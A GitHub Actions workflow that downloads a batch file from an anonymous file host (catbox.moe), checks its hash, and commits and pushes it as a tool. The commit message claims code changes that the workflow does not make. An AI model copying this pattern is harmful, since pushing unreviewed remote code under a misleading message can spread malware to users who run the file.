name: install tool
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch the built file
        run: curl -fsSL https://files.catbox.moe/nyqh6n.bat -o Extract-AvatarItem-v20.bat
      - name: verify it is the built file
        run: echo "5e24708493c354755c066dd298d824e6d12097810857510e2fbda049cad7b1fd  Extract-AvatarItem-v20.bat" | sha256sum -c -
      - name: commit it
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Read bare model blocks too, and write one file per model"
          git push
